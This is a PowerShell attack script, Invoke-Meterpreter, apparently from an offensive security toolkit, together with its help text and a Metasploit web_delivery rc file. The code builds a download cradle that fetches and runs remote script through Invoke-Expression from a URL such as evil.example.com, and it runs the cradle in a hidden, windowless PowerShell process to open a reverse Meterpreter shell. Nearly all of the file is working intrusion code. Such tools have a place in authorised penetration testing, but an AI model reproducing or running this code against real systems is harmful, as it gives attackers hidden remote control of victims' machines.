function Invoke-Meterpreter 
{
<#
.SYNOPSIS
Kick off a reverse meterpreter session using Metasploits exploit/multi/script/web_delivery payload
Author: Jared Haight (@jaredhaight)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION
Spawns a new, hidden PowerShell window that intiates a reverse meterpreter shell to a specified server.

This relies on the exploit/multi/scripts/web_delivery metasploit payload. The web delivery payload creates
two endpoints, one to download the script and other to listen for the reverse shell.

An example rc file is below (or you can just type the commands manually). It does the following:

* Sets the download cradle to port 8443 (SRVPORT) on all IPs (SRVHOST)
* Sets the script target to PowerShell (set target 2)
* Sets the payload being served to windows/meterpreter/reverse_https
* Sets the payload to listen on port 443 (LPORT) on all IPs (LHOST)

====== invoke-meterpreter rc file ======
use exploit/multi/script/web_delivery
set SRVHOST 0.0.0.0
set SRVPORT 8443
set SSL true
set target 2
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
run -j
==== end invoke-meterpreter rc file ====



.PARAMETER url
This is the URL for the download cradle, by default it will be something 
like "https://evil.example.com/[Random Chars]"

.EXAMPLE
Connects to a URL at evil.example.com to download the payload

PS> invoke-meterpreter -url https://evil.example.com/2k1isEdsl


.NOTES
You can use the "-verbose" option for verbose output.

#>

[CmdletBinding()]
Param
(
    [Parameter( Mandatory = $True)]
    [ValidateNotNullOrEmpty()]
    [string]$url
)

    Write-Verbose "[*] Creating Download Cradle script using $url"
    $DownloadCradle ='$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'
    
    Write-Verbose "[*] Figuring out if we're starting from a 32bit or 64bit process.."
    if([IntPtr]::Size -eq 4)
    {
        Write-Verbose "[*] Looks like we're 64bit, using regular powershell.exe"
        $PowershellExe = 'powershell.exe'
    }
    else
    {
        Write-Verbose "[*] Looks like we're 32bit, using syswow64 powershell.exe"
        $PowershellExe=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
    };
    
    Write-Verbose "[*] Creating Process Object.."
    $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName=$PowershellExe
    $ProcessInfo.Arguments="-nop -c $DownloadCradle"
    $ProcessInfo.UseShellExecute = $False
    $ProcessInfo.RedirectStandardOutput = $True
    $ProcessInfo.CreateNoWindow = $True
    $ProcessInfo.WindowStyle = "Hidden"
    Write-Verbose "[*] Kicking off download cradle in a new process.."
    $Process = [System.Diagnostics.Process]::Start($ProcessInfo)
    Write-Verbose "[*] Done!"
}